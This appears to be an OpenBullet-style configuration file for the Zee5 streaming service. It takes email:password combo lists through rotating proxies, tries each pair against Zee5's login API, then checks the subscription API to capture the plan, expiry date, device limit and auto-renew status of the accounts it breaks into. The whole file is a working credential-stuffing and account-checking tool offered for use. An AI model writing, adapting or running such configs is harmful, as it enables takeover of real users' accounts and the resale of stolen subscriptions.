@@ -1,0 +1,130 @@
+[SETTINGS]
+{
+  "Name": "Zee5",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T17:59:23.9972212+06:00",
+  "AdditionalInfo": "",
+  "Author": "Alpha_Coder (╬ ಠ益ಠ) _|__ <3",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Req REQUEST POST "https://userapi.zee5.com/v2/user/loginemail" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: userapi.zee5.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Origin: https://www.zee5.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.zee5.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 54" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "The email address and password combination was wrong during login." 
+    KEY "The Email field is required." 
+    KEY "{\"code\":3," 
+    KEY "The field Password must be a string with a minimum length of 6 and a maximum length of 2147483647." 
+    KEY "The Password field is required." 
+    KEY "{\"code\":2120," 
+
+#Auth_Token PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "Auth_Token" 
+
+#Premium_Req REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_active=true" 
+  
+  HEADER "Host: subscriptionapi.zee5.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Authorization: bearer <Auth_Token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Origin: https://www.zee5.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.zee5.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#CurrentDate FUNCTION CurrentUnixTime -> VAR "TodayDate" 
+
+#Plan PARSE "<SOURCE>" LR "original_title\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Expiry PARSE "<SOURCE>" LR "subscription_end\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#ExpiryUnix FUNCTION DateToUnixTime "<Expiry>" -> VAR "ExpiryUnix" 
+
+!#ReplaceExpiryUnixTime FUNCTION Replace "<Expiry>" "<ExpiryUnix>" "<ExpiryUnix>" -> VAR "ExpiryUnixTime" 
+
+#Allow_Devices PARSE "<SOURCE>" LR "number_of_supported_devices\":" "," CreateEmpty=FALSE -> CAP "Allow Devices" 
+
+#Auto_Renew PARSE "<SOURCE>" LR "recurring_enabled\":" "," CreateEmpty=FALSE -> CAP "Auto_Renew" 
+
+#Renew_True FUNCTION Replace "true" "Yes" "<Auto_Renew>" -> CAP "Auto_Renew" 
+
+#Renew_False FUNCTION Replace "false" "No" "<Auto_Renew>" -> CAP "Auto_Renew" 
+
+#Final_Key KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Success OR 
+    KEY "<ExpiryUnix>" GreaterThan "<TodayDate>" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<ExpiryUnix>" LessThan "<TodayDate>" 
+    KEY "<ExpiryUnix>" EqualTo "<TodayDate>" 
+    KEY "\"state\":\"failed\"" 
+    KEY "\"state\":\"pending\"" 
+
+#Credit FUNCTION Constant "Alpha_Coder (╬ ಠ益ಠ) _|__ <3" -> CAP "Config By" 
+
